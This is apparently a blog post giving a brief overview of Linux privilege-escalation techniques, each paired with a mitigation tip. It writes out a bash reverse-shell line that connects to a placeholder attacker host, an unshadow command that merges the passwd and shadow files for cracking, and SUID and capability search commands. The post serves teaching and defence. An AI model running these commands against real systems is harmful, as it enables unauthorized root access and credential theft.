Understanding Linux Privilege Escalation

July 30, 2025

This post covers Linux Privilege Escalation and an explanation of all exploits found in it used to gain root access.

PATH Hijacking

Tricking the system into running a malicious file instead of the intended legitimate one during a file search.

  • Occurs when a malicious executable is placed earlier in the PATH than the legitimate binary.
  • Use absolute paths or sanitize environment variables to prevent abuse.
  • Example: Creating a fake binary in /tmp and prepending it to $PATH.

SUID Exploitation

Exploiting files with the SUID bit to execute with the file owner’s privileges, often root.

  • Find with: find / -perm -4000 -type f 2>/dev/null
  • Exploit binaries like vim, nmap, or python.
  • Use GTFOBins for known exploits.

SUDO Exploitation

Abusing misconfigured sudo privileges to run commands as root without password.

  • Check with: sudo -l
  • Exploit allowed commands like editors or scripts.
  • Avoid ALL or NOPASSWD misconfigurations for security.

Wildcard Expansion Exploitation

Manipulating wildcard usage in commands to execute unintended behavior.

  • Abuse of wildcards like * in scripts using tools like tar.
  • Create files with special names to hijack script behavior.
  • Prevent by quoting arguments or using -- to stop option parsing.

Reverse Shell

Gaining remote control of a machine by connecting back to the attacker’s listener.

  • Common payload: bash -i >& /dev/tcp/attacker_ip/4444 0>&1
  • Used for persistence or privilege escalation chaining.
  • Detect via outbound connection monitoring and egress filtering.

Unshadow Attack

Cracking password hashes by combining passwd and shadow files.

  • Use unshadow /etc/passwd /etc/shadow > unshadowed.txt
  • Crack with john or hashcat.
  • Protect by securing shadow files and enforcing strong password policies.

System Enumeration

Gathering information about the target Linux system for exploitation paths.

  • Commands: uname -a, ps aux, netstat, id
  • Understand users, groups, services, and kernel version.
  • Vital for planning privilege escalation.

Cronjob Enumeration

Finding scheduled tasks that may run as root or privileged users.

  • Check with: cat /etc/crontab, ls -la /etc/cron.*
  • Exploit writable scripts or binaries executed by cron.
  • Secure by restricting writable access to cron-executed files.

Capabilities Enumeration

Linux capabilities may allow privilege escalation without SUID bit.

  • Check with: getcap -r / 2>/dev/null
  • Use: cap_setuid+ep with python, perl, or bash to get root.
  • Use setcap -r to remove dangerous capabilities.

Local Service Exploitation

Abusing misconfigured or vulnerable local services to elevate privileges.

  • Examples: Redis with no password, MySQL with root user access.
  • Leverage access to write files or inject cron jobs.
  • Secure by restricting service access and enforcing authentication.

Linux Binary Exploitation

Exploiting vulnerable local applications via memory corruption bugs.

  • Focus on buffer overflows, format strings, or ROP chains.
  • Use GDB, pwndbg, and exploit-db PoCs.
  • Protect via stack canaries, ASLR, NX, and code audits.

Linux Kernel Exploitation

Using unpatched kernel vulnerabilities to escalate to root.

  • Identify kernel: uname -r
  • Use tools like linux-exploit-suggester to find applicable exploits.
  • Famous exploits: Dirty COW, OverlayFS, CVE-2022-0847
  • Mitigate by patching and running LTS/stable kernels.
